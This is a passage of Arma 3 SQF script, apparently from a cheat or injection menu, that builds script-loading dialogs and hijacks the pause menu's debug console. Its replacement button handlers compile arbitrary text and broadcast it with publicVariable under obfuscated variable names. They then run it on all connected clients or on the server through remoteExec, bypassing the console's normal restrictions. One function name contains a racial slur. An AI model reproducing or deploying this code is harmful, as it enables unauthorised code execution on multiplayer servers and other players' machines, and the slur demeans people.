                        EDC_loadScript_ctrl_scriptExpression = EDC_display_loadScript ctrlCreate["RscEditMulti", -1];
                        EDC_loadScript_ctrl_scriptExpression ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.544 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.154 * safezoneH];
                        EDC_loadScript_ctrl_scriptExpression ctrlSetBackgroundColor[0, 0, 0, 0.5];
                        EDC_loadScript_ctrl_scriptExpression ctrlSetText '''';
                        EDC_loadScript_ctrl_scriptExpression ctrlCommit 0;

                        _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []];

                        _ctrl_scripts = EDC_display_loadScript ctrlCreate["RscListBox", -1];
                        uiNameSpace setVariable[''EDC_ctrl_savedScriptsList'', _ctrl_scripts];
                        _ctrl_scripts ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.313 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.143 * safezoneH];
                        _ctrl_scripts ctrlSetBackgroundColor[0, 0, 0, 0]; {
                            _data = _x;
                            _dataStr = _x;
                            _dataStr = str _dataStr;
                            _scriptName = _data select 0;
                            _scriptExpression = _data select 1;
                            _index = _ctrl_scripts lbAdd _dataStr;
                            _ctrl_scripts lbSetPicture[_index, ''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''];
                            _ctrl_scripts lbSetPictureColor[_index, [1, 1, 1, 1]];
                            _ctrl_scripts lbSetData[_index, _dataStr];
                        }
                        forEach _savedScripts;
                        _placeHolders = [
                            '''',
                            ''''
                        ]; {
                            _index = _ctrl_scripts lbAdd _x;
                            _ctrl_scripts lbSetData[_index, "['''','''']"];
                        }
                        forEach _placeHolders;
                        _ctrl_scripts ctrlAddEventHandler["LBSelChanged", {
                            params["_control", "_selectedIndex"];
                            _data = call compile(_control lbData _selectedIndex);
                            _scriptName = _data select 0;
                            _scriptExpression = _data select 1;
                            with uiNameSpace do {
                                disableSerialization;
                                EDC_loadScript_ctrl_scriptName ctrlSetText _scriptName;
                                EDC_loadScript_ctrl_scriptExpression ctrlSetText _scriptExpression;
                            };
                        }];
                        _ctrl_scripts ctrlCommit 0;
                        _ctrl_scripts lbSetCurSel 0;

                        _buttonLoad = EDC_display_loadScript ctrlCreate["RscButtonMenu", -1];
                        _buttonLoad ctrlSetPosition[0.62375 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonLoad ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>LOAD</t>");
                        _buttonLoad ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            [_control] spawn {
                                params["_control"];
                                with uiNamespace do {
                                    disableSerialization;
                                    _parentDisplay = ctrlParent _control;
                                    _scriptExpression = ctrlText EDC_loadScript_ctrl_scriptExpression;
                                    if (_scriptExpression == '''') exitWith {
                                        systemChat ''Error : Selected script is blank.'';
                                        if (!isGamePaused) then {
                                            playSound ''addItemFailed'';
                                        };
                                    };
                                    _parentDisplay closeDisplay 0;
                                    waitUntil {
                                        (!isNull findDisplay 49)
                                    };
                                    _IDD_RscDisplayInterrupt = 49;
                                    _IDC_RscDebugConsole = 13184;
                                    _pauseMenu = findDisplay _IDD_RscDisplayInterrupt;
                                    _debugConsole = _pauseMenu displayCtrl _IDC_RscDebugConsole;
                                    _debugConsole ctrlShow true;
                                    _debugConsole ctrlEnable true;
                                    _debugConsole ctrlCommit 0;
                                    if (ctrlShown _debugConsole) then {
                                        _expression = _pauseMenu displayCtrl 12284;
                                        _expression ctrlSetText _scriptExpression;
                                        _expression ctrlCommit 0;
                                        profileNamespace setVariable["RscDebugConsole_expression", _scriptExpression];
                                        if (!isGamePaused) then {
                                            playSound ''addItemOK'';
                                        };
                                    };
                                };
                            };
                        }];
                        _buttonLoad ctrlCommit 0;

                        _buttonDelete = EDC_display_loadScript ctrlCreate["RscButtonMenu", -1];
                        _buttonDelete ctrlSetPosition[0.381406 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonDelete ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>DELETE</t>");
                        _buttonDelete ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            with uiNamespace do {
                                disableSerialization;
                                _savedScripts1 = profileNamespace getVariable[''EDC_savedScripts'', []];
                                _savedScripts2 = profileNamespace getVariable[''EDC_savedScripts'', []];
                                _ctrl_scripts = uiNameSpace getVariable ''EDC_ctrl_savedScriptsList'';
                                _selectedIndex = lbCurSel _ctrl_scripts;
                                _thisData = call compile(_ctrl_scripts lbData _selectedIndex);
                                _thisScriptName = _thisData# 0; {
                                    if (_x isEqualTo _thisData) exitWith {
                                        _savedScripts1 deleteAt _forEachIndex;
                                        profileNamespace setVariable[''EDC_savedScripts'', _savedScripts1];
                                        saveProfileNamespace;
                                        if (!isGamePaused) then {
                                            playSound ''addItemOK'';
                                        };
                                        systemChat format[''Script %1 deleted from profile'', _thisScriptName];
                                    };
                                }
                                forEach _savedScripts2;
                                lbClear _ctrl_scripts;
                                _ctrl_scripts ctrlCommit 0;
                                _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []]; {
                                    _data = _x;
                                    _dataStr = _x;
                                    _dataStr = str _dataStr;
                                    _scriptName = _data select 0;
                                    _scriptExpression = _data select 1;
                                    _index = _ctrl_scripts lbAdd _dataStr;
                                    _ctrl_scripts lbSetPicture[_index, ''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''];
                                    _ctrl_scripts lbSetPictureColor[_index, [1, 1, 1, 1]];
                                    _ctrl_scripts lbSetData[_index, _dataStr];
                                }
                                forEach _savedScripts;
                                _placeHolders = [
                                    '''',
                                    ''''
                                ]; {
                                    _index = _ctrl_scripts lbAdd _x;
                                    _ctrl_scripts lbSetData[_index, "['''','''']"];
                                }
                                forEach _placeHolders;
                                _ctrl_scripts ctrlCommit 0;
                                _ctrl_scripts lbSetCurSel _selectedIndex;
                            };
                        }];
                        _buttonDelete ctrlCommit 0;
                    };
                };

                EDC_fnc_loadScriptHistory = {
                    with uiNamespace do {
                        disableSerialization;

                        _displayNum = 49;
                        if (isNull(findDisplay 49)) then {
                            _displayNum = 46;
                        };

                        EDC_display_loadScriptHistory = (findDisplay _displayNum) createDisplay "RscDisplayEmpty";
                        showChat true;
                        _txtSize = safeZoneH * 0.5;


                        _ctrl_title = EDC_display_loadScriptHistory ctrlCreate["RscStructuredText", -1];
                        _ctrl_title ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.236 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.022 * safezoneH];
                        _ctrl_title ctrlSetBackgroundColor[(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
                        _ctrl_title ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Script History</t>");
                        _ctrl_title ctrlCommit 0;

                        _ctrl_background = EDC_display_loadScriptHistory ctrlCreate["RscText", -1];
                        _ctrl_background ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.269 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.44 * safezoneH];
                        _ctrl_background ctrlSetBackgroundColor[0, 0, 0, 0.6];
                        _ctrl_background ctrlCommit 0;

                        _ctrl_titleScripts = EDC_display_loadScriptHistory ctrlCreate["RscStructuredText", -1];
                        _ctrl_titleScripts ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
                        _ctrl_titleScripts ctrlSetBackgroundColor[0, 0, 0, 0];
                        _ctrl_titleScripts ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Scripts</t>");
                        _ctrl_titleScripts ctrlCommit 0;

                        _ctrl_titleSelected = EDC_display_loadScriptHistory ctrlCreate["RscStructuredText", -1];
                        _ctrl_titleSelected ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.467 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
                        _ctrl_titleSelected ctrlSetBackgroundColor[0, 0, 0, 0];
                        _ctrl_titleSelected ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Selected</t>");
                        _ctrl_titleSelected ctrlCommit 0;

                        _buttonCancel = EDC_display_loadScriptHistory ctrlCreate["RscButtonMenu", -1];
                        _buttonCancel ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonCancel ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>CANCEL</t>");
                        _buttonCancel ctrlSetTooltip ''Close'';
                        _buttonCancel ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            with uiNamespace do {
                                disableSerialization;
                                _parentDisplay = ctrlParent _control;
                                _parentDisplay closeDisplay 0;
                            };
                        }];
                        _buttonCancel ctrlCommit 0;

                        EDC_loadScriptHistory_ctrl_scriptName = EDC_display_loadScriptHistory ctrlCreate["RscEdit", -1];
                        EDC_loadScriptHistory_ctrl_scriptName ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.5 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.033 * safezoneH];
                        EDC_loadScriptHistory_ctrl_scriptName ctrlSetBackgroundColor[0, 0, 0, 0.5];
                        EDC_loadScriptHistory_ctrl_scriptName ctrlSetText '''';
                        EDC_loadScriptHistory_ctrl_scriptName ctrlCommit 0;

                        EDC_loadScriptHistory_ctrl_scriptExpression = EDC_display_loadScriptHistory ctrlCreate["RscEditMulti", -1];
                        EDC_loadScriptHistory_ctrl_scriptExpression ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.544 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.154 * safezoneH];
                        EDC_loadScriptHistory_ctrl_scriptExpression ctrlSetBackgroundColor[0, 0, 0, 0.5];
                        EDC_loadScriptHistory_ctrl_scriptExpression ctrlSetText '''';
                        EDC_loadScriptHistory_ctrl_scriptExpression ctrlCommit 0;


                        _ctrl_scripts = EDC_display_loadScriptHistory ctrlCreate["RscListBox", -1];
                        uiNameSpace setVariable[''EDC_ctrl_savedScriptsList'', _ctrl_scripts];
                        _ctrl_scripts ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.313 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.143 * safezoneH];
                        _ctrl_scripts ctrlSetBackgroundColor[0, 0, 0, 0];

                        _expressionHistory_BIS = profilenamespace getVariable[''RscDebugConsole_expressionHistory'', []]; {
                            _data = _x;
                            _dataStr = _x;
                            _dataStr = str _dataStr;
                            _scriptName = str _forEachIndex;
                            _scriptExpression = _data;
                            _index = _ctrl_scripts lbAdd _dataStr;
                            _ctrl_scripts lbSetPicture[_index, ''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''];
                            _ctrl_scripts lbSetPictureColor[_index, [1, 1, 1, 1]];
                            _ctrl_scripts lbSetData[_index, _dataStr];
                        }
                        forEach _expressionHistory_BIS;

                        _placeHolders = [
                            '''',
                            ''''
                        ]; {
                            _index = _ctrl_scripts lbAdd _x;
                            _ctrl_scripts lbSetData[_index, "['''','''']"];
                        }
                        forEach _placeHolders;

                        _ctrl_scripts ctrlAddEventHandler["LBSelChanged", {
                            params["_control", "_selectedIndex"];
                            _data = call compile(_control lbData _selectedIndex);
                            _scriptExpression = _data;
                            with uiNameSpace do {
                                disableSerialization;
                                EDC_loadScriptHistory_ctrl_scriptName ctrlSetText str _selectedIndex;
                                EDC_loadScriptHistory_ctrl_scriptExpression ctrlSetText _scriptExpression;
                            };
                        }];
                        _ctrl_scripts ctrlCommit 0;
                        _ctrl_scripts lbSetCurSel 0;

                        _buttonLoad = EDC_display_loadScriptHistory ctrlCreate["RscButtonMenu", -1];
                        _buttonLoad ctrlSetPosition[0.62375 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonLoad ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>LOAD</t>");
                        _buttonLoad ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            [_control] spawn {
                                params["_control"];
                                with uiNamespace do {
                                    disableSerialization;
                                    _parentDisplay = ctrlParent _control;
                                    _scriptExpression = ctrlText EDC_loadScriptHistory_ctrl_scriptExpression;
                                    if (_scriptExpression == '''') exitWith {
                                        systemChat ''Error : Selected script is blank.'';
                                        if (!isGamePaused) then {
                                            playSound ''addItemFailed'';
                                        };
                                    };
                                    _parentDisplay closeDisplay 0;
                                    waitUntil {
                                        (!isNull findDisplay 49)
                                    };
                                    _IDD_RscDisplayInterrupt = 49;
                                    _IDC_RscDebugConsole = 13184;
                                    _pauseMenu = findDisplay _IDD_RscDisplayInterrupt;
                                    _debugConsole = _pauseMenu displayCtrl _IDC_RscDebugConsole;
                                    _debugConsole ctrlShow true;
                                    _debugConsole ctrlEnable true;
                                    _debugConsole ctrlCommit 0;
                                    if (ctrlShown _debugConsole) then {
                                        _expression = _pauseMenu displayCtrl 12284;
                                        _expression ctrlSetText _scriptExpression;
                                        _expression ctrlCommit 0;
                                        profileNamespace setVariable["RscDebugConsole_expression", _scriptExpression];
                                        if (!isGamePaused) then {
                                            playSound ''addItemOK'';
                                        };
                                    };
                                };
                            };
                        }];
                        _buttonLoad ctrlCommit 0;

                        _buttonDelete = EDC_display_loadScriptHistory ctrlCreate["RscButtonMenu", -1];
                        _buttonDelete ctrlSetPosition[0.381406 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonDelete ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>DELETE</t>");
                        _buttonDelete ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            with uiNamespace do {
                                disableSerialization;
                                _savedScripts1 = profileNamespace getVariable[''RscDebugConsole_expressionHistory'', []];
                                _savedScripts2 = profileNamespace getVariable[''RscDebugConsole_expressionHistory'', []];
                                _ctrl_scripts = uiNameSpace getVariable ''EDC_ctrl_savedScriptsList'';
                                _selectedIndex = lbCurSel _ctrl_scripts;
                                _thisData = call compile(_ctrl_scripts lbData _selectedIndex);
                                _thisScriptName = str _selectedIndex; {
                                    if (_x isEqualTo _thisData) exitWith {
                                        _savedScripts1 deleteAt _forEachIndex;
                                        profileNamespace setVariable[''RscDebugConsole_expressionHistory'', _savedScripts1];
                                        saveProfileNamespace;
                                        if (!isGamePaused) then {
                                            playSound ''addItemOK'';
                                        };
                                        systemChat format[''Script %1 deleted from profile'', _thisScriptName];
                                    };
                                }
                                forEach _savedScripts2;
                                lbClear _ctrl_scripts;
                                _ctrl_scripts ctrlCommit 0;




                                _expressionHistory_BIS = profilenamespace getVariable[''RscDebugConsole_expressionHistory'', []]; {
                                    _data = _x;
                                    _dataStr = _x;
                                    _dataStr = str _dataStr;
                                    _scriptName = str _forEachIndex;
                                    _scriptExpression = _data;
                                    _index = _ctrl_scripts lbAdd _dataStr;
                                    _ctrl_scripts lbSetPicture[_index, ''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''];
                                    _ctrl_scripts lbSetPictureColor[_index, [1, 1, 1, 1]];
                                    _ctrl_scripts lbSetData[_index, _dataStr];
                                }
                                forEach _expressionHistory_BIS;

                                _placeHolders = [
                                    '''',
                                    ''''
                                ]; {
                                    _index = _ctrl_scripts lbAdd _x;
                                    _ctrl_scripts lbSetData[_index, "['''','''']"];
                                }
                                forEach _placeHolders;







                                _ctrl_scripts ctrlCommit 0;
                                _ctrl_scripts lbSetCurSel _selectedIndex;
                            };
                        }];
                        _buttonDelete ctrlCommit 0;
                    };
                };

                EDC_fnc_editDebugConsole_old2 = {
                    with uiNamespace do {
                        disableSerialization;
                        _IDD_RscDisplayInterrupt = 49;
                        _IDC_RscDebugConsole = 13184;
                        _pauseMenu = findDisplay _IDD_RscDisplayInterrupt;
                        _debugConsole = _pauseMenu displayCtrl _IDC_RscDebugConsole;
                        _abortButton = _pauseMenu displayCtrl 104;
                        if (not(isNull(findDisplay 60492))) then {
                            _ctrlPos = ctrlPosition _abortButton;
                            _abortButton ctrlEnable false;
                            _abortButton ctrlShow false;
                            _abortButton ctrlcommit 0;

                            _newButton = _pauseMenu ctrlCreate["RscButtonMenu", -1];
                            _newButton ctrlSetPosition _ctrlPos;
                            _newButton ctrlSetBackgroundColor[0.4, 0.01, 0.01, 0.7];
                            _newButton ctrlSetText "Close Spectator";
                            _newButton ctrlSetEventHandler["ButtonClick", " [] spawn {
                                    _unSpect = {
                                        [''Terminate''] call BIS_fnc_EGSpectator;
                                        (findDisplay 60492) closeDisplay 0;
                                        [''Exit''] call BIS_fnc_camera;
                                        (findDisplay 314) closeDisplay 0;
                                    };
                                    (findDisplay 49) closeDisplay 0;
                                    sleep 0.01;
                                    [] spawn _unSpect;
                                };
                                "];
                                _newButton ctrlCommit 0;
                            };
                            if (not(isNull(findDisplay 314))) then {
                                if (isNull(_pauseMenu displayCtrl 2)) then {
                                    _ctrlPos = ctrlPosition _abortButton;
                                    _abortButton ctrlEnable false;
                                    _abortButton ctrlShow false;
                                    _abortButton ctrlcommit 0;

                                    _newButton = _pauseMenu ctrlCreate["RscButtonMenu", -1];
                                    _newButton ctrlSetPosition _ctrlPos;
                                    _newButton ctrlSetBackgroundColor[0.4, 0.01, 0.01, 0.7];
                                    _newButton ctrlSetText "Close Camera";
                                    _newButton ctrlSetEventHandler["ButtonClick", " [] spawn {
                                            _exitCam = {
                                                [''Exit''] call BIS_fnc_camera;
                                                (findDisplay 314) closeDisplay 0;
                                                [''Terminate''] call BIS_fnc_EGSpectator;
                                                (findDisplay 60492) closeDisplay 0;
                                            };
                                            (findDisplay 49) closeDisplay 0;
                                            sleep 0.01;
                                            [] spawn _exitCam;
                                        };
                                        "];
                                        _newButton ctrlCommit 0;
                                    };
                                };
                                if (ctrlShown _debugConsole) then {
                                    _ctrlsToEdit = [
                                        13285,
                                        13484,
                                        13286,
                                        13290,
                                        13289,
                                        13292,
                                        13287,
                                        13288,
                                        13291,
                                        13284,
                                        13190
                                    ]; {
                                        if ((ctrlIDC _x) in _ctrlsToEdit) then {
                                            _x ctrlRemoveAllEventHandlers "ButtonClick";
                                            _x ctrlRemoveAllEventHandlers "ButtonDblClick";
                                            _x ctrlRemoveAllEventHandlers "ButtonDown";
                                            _x ctrlRemoveAllEventHandlers "ButtonUp";
                                        };
                                    }
                                    forEach allControls _pauseMenu;
                                };
                                _debugConsole ctrlShow true;
                                _debugConsole ctrlEnable true;
                                _debugConsole ctrlCommit 0;
                                waitUntil {
                                    (ctrlShown _debugConsole)
                                };



                                if (ctrlShown _debugConsole) then {
                                    {
                                        _ctrl = _x;
                                        _ctrlIDC = (ctrlIDC _ctrl);

                                        if (_ctrlIDC == 12284) then {
                                            uiNameSpace setVariable[''JAM_ctrl_OfficialDebugConsole_Expression'', _pauseMenu displayctrl _ctrlIDC];
                                            (uiNameSpace getVariable "JAM_ctrl_OfficialDebugConsole_Expression") ctrlSetText(profileNamespace getVariable["RscDebugConsole_expression", ""]);
                                            (uiNameSpace getVariable "JAM_ctrl_OfficialDebugConsole_Expression") ctrladdEventHandler["KeyDown", {
                                                profileNamespace setVariable["RscDebugConsole_expression", ctrlText(uiNameSpace getVariable "JAM_ctrl_OfficialDebugConsole_Expression")];
                                            }];


                                            if (!isNil ''JAM_EH_scriptHistoryKeybind'') then {
                                                _pauseMenu displayRemoveEventHandler[''KeyDown'', JAM_EH_scriptHistoryKeybind];

                                            };

                                            JAM_EH_scriptHistoryKeybind = _pauseMenu displayAddEventHandler["KeyDown", {
                                                params["_parentDisplay", "_key"];
                                                _pageUp = 201;
                                                _pageDown = 209;
                                                _keys = [_pageUp, _pageDown];
                                                if (_key in _keys) then {
                                                    [] spawn EDC_fnc_loadScriptHistory;
                                                };
                                            }];



                                        };

                                        if (_ctrlIDC == 13285) then {
                                            uiNameSpace setVariable[''JAM_ctrl_OfficialDebugConsole_ButtonExecuteAll'', _pauseMenu displayctrl _ctrlIDC];
                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ButtonExecuteAll'') ctrladdEventHandler["ButtonClick", {
                                                _codeText = ctrlText(uiNameSpace getVariable "JAM_ctrl_OfficialDebugConsole_Expression");
                                                if ((_codeText == "")) then {
                                                    playsound "addItemFailed";

                                                }
                                                else {
                                                    if (JAM_remoteExec) then {
                                                        playsound "addItemOK";
                                                        _codeText = [_codeText] call JAM_fnc_removeCommentsA;
                                                        _saghdfsa54 = compile _codeText;
                                                        gshvfdags5 = [''hg7d'', _saghdfsa54, ''sd7f''];
                                                        publicVariable ''gshvfdags5'';
                                                        _ydsv5 = {

                                                            _code = gshvfdags5 select 1;
                                                            _return = ([nil] apply {
                                                                    [] call _code
                                                                }
                                                                param[0, text ""]);

                                                            _bjhasdgvfsd8 = {
                                                                _return = _this;
                                                                with uiNamespace do {
                                                                    _returnStr = str _return;
                                                                    disableSerialization;
                                                                    _outputCtrlServerExecColor = [0.1, 0, 0, 0.8];
                                                                    (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetText _returnStr;
                                                                    (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetBackgroundColor _outputCtrlServerExecColor;
                                                                    (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlCommit 0;
                                                                    profileNamespace setVariable["JAM_debugConsole_lastExpressionOutput", _returnStr];
                                                                    profileNameSpace setVariable["JAM_debugConsole_lastExpressionOutputColor", _outputCtrlServerExecColor];
                                                                };

                                                            };
                                                            kjmnbhgvf7 = [''as76d'', _bjhasdgvfsd8, ''ds76a''];
                                                            publicVariable ''kjmnbhgvf7'';

                                                            [_return, {
                                                                _this spawn(kjmnbhgvf7 select 1);
                                                            }] remoteExec[''spawn'', remoteExecutedOwner];

                                                        };

                                                        nhgyba9 = [

                                                            ''fg3'', _ydsv5, ''fj3''
                                                        ];

                                                        publicVariable ''nhgyba9'';

                                                        _return = [
                                                            [], {
                                                                [] spawn(nhgyba9 select 1);
                                                            }
                                                        ] remoteExec[''spawn'', 0];
                                                        _returnStr = str _return;
                                                        with uiNamespace do {
                                                            disableSerialization;
                                                            _outputCtrlServerExecColor = [0.1, 0, 0, 0.8];
                                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetText _returnStr;
                                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetBackgroundColor _outputCtrlServerExecColor;
                                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlCommit 0;
                                                            profileNamespace setVariable["JAM_debugConsole_lastExpressionOutput", _returnStr];
                                                            profileNameSpace setVariable["JAM_debugConsole_lastExpressionOutputColor", _outputCtrlServerExecColor];
                                                            profileNamespace setVariable["RscDebugConsole_expression", _codeText];
                                                        };
                                                    }
                                                    else {
                                                        playsound "addItemFailed";

                                                    };
                                                };
                                            }];
                                        };

                                        if (_ctrlIDC == 13484) then {
                                            uiNameSpace setVariable[''JAM_ctrl_OfficialDebugConsole_ButtonExecuteLocal'', _pauseMenu displayctrl _ctrlIDC];
                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ButtonExecuteLocal'') ctrladdEventHandler["ButtonClick", {
                                                _codeText = ctrlText(uiNameSpace getVariable "JAM_ctrl_OfficialDebugConsole_Expression");
                                                if (toLower _codeText == ''utils'') exitWith {
                                                    0 execVM ''\A3\Functions_F\Debug\Utilities\lib\index.sqf'';
                                                };
                                                if ((_codeText == "")) then {
                                                    playsound "addItemFailed";

                                                }
                                                else {
                                                    playsound "addItemOK";
                                                    _codeText = [_codeText] call JAM_fnc_removeCommentsA;
                                                    _code = compile _codeText;

                                                    _return = ([nil] apply {
                                                            [] call _code
                                                        }
                                                        param[0, text ""]);
                                                    with uiNamespace do {
                                                        _returnStr = str _return;
                                                        disableSerialization;
                                                        _outputCtrlServerExecColor = [0, 0, 0.1, 0.8];
                                                        (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetText str _return;
                                                        (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetBackgroundColor _outputCtrlServerExecColor;
                                                        (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlCommit 0;
                                                        profileNamespace setVariable["JAM_debugConsole_lastExpressionOutput", _returnStr];
                                                        profileNameSpace setVariable["JAM_debugConsole_lastExpressionOutputColor", _outputCtrlServerExecColor];
                                                        profileNamespace setVariable["RscDebugConsole_expression", _codeText];
                                                    };
                                                };
                                            }];
                                        };

                                        if (_ctrlIDC == 13286) then {
                                            uiNameSpace setVariable[''JAM_ctrl_OfficialDebugConsole_ButtonExecuteServer'', _pauseMenu displayctrl _ctrlIDC];
                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ButtonExecuteServer'') ctrladdEventHandler["ButtonClick", {
                                                _codeText = ctrlText(uiNameSpace getVariable "JAM_ctrl_OfficialDebugConsole_Expression");
                                                if ((_codeText == "")) then {
                                                    playsound "addItemFailed";

                                                }
                                                else {
                                                    if (JAM_remoteExec) then {
                                                        playsound "addItemOK";
                                                        _codeText = [_codeText] call JAM_fnc_removeCommentsA;
                                                        _code = compile _codeText;
                                                        EDC_RE_fnc_srvrexc_code = [''monkey'', _code, ''business''];
                                                        publicVariable ''EDC_RE_fnc_srvrexc_code'';
                                                        _fnc_serverExec = {
                                                            _code = EDC_RE_fnc_srvrexc_code select 1;
                                                            _return = ([nil] apply {
                                                                    [] call _code
                                                                }
                                                                param[0, text ""]);

                                                            _fnc_nibbasBeLike = {
                                                                _return = _this;
                                                                with uiNamespace do {
                                                                    _returnStr = str _return;
                                                                    disableSerialization;
                                                                    _outputCtrlServerExecColor = [0, 0.1, 0, 0.8];
                                                                    (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetText _returnStr;
                                                                    (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetBackgroundColor _outputCtrlServerExecColor;
                                                                    (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlCommit 0;
                                                                    profileNamespace setVariable["JAM_debugConsole_lastExpressionOutput", _returnStr];
                                                                    profileNameSpace setVariable["JAM_debugConsole_lastExpressionOutputColor", _outputCtrlServerExecColor];
                                                                };

                                                            };

                                                            EDC_RE_fnc_serverExec = [''a'', _fnc_nibbasBeLike, ''asd''];

                                                            publicVariable ''EDC_RE_fnc_serverExec'';


                                                            [_return, {
                                                                _this spawn(EDC_RE_fnc_serverExec select 1);
                                                            }] remoteExec[''spawn'', remoteExecutedOwner];

                                                        };
                                                        EDC_RE_fnc_srvrexc = [''fds'', _fnc_serverExec, ''asd''];
                                                        publicVariableServer ''EDC_RE_fnc_srvrexc'';
                                                        _return = [
                                                            [], {
                                                                [] spawn(EDC_RE_fnc_srvrexc select 1);
                                                            }
                                                        ] remoteExec[''spawn'', 2];
                                                        _returnStr = str _return;
                                                        with uiNamespace do {
                                                            disableSerialization;
                                                            _outputCtrlServerExecColor = [0, 0.1, 0, 0.8];
                                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetText _returnStr;
                                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetBackgroundColor _outputCtrlServerExecColor;
                                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlCommit 0;
                                                            profileNamespace setVariable["JAM_debugConsole_lastExpressionOutput", _returnStr];
                                                            profileNameSpace setVariable["JAM_debugConsole_lastExpressionOutputColor", _outputCtrlServerExecColor];
                                                            profileNamespace setVariable["RscDebugConsole_expression", _codeText];
                                                        };
                                                    }
                                                    else {
                                                        playsound "addItemFailed";

                                                    };
                                                };
                                            }];
                                        };

                                        if (_ctrlIDC == 13290) then {
                                            uinamespace setvariable[''JAM_ctrl_OfficialDebugConsole_ButtonConfig'', (_pauseMenu displayctrl _ctrlIDC)];
                                            (uinamespace getvariable ''JAM_ctrl_OfficialDebugConsole_ButtonConfig'') ctrladdEventHandler["ButtonClick", {
                                                [] spawn JAM_fnc_configViewer;
                                            }];
                                        };

                                        if (_ctrlIDC == 13289) then {
                                            uinamespace setvariable[''JAM_ctrl_OfficialDebugConsole_ButtonFunctions'', (_pauseMenu displayctrl _ctrlIDC)];
                                            (uinamespace getvariable ''JAM_ctrl_OfficialDebugConsole_ButtonFunctions'') ctrladdEventHandler["ButtonClick", {
                                                [] spawn JAM_fnc_help;
                                            }];
                                        };

                                        if (_ctrlIDC == 13292) then {
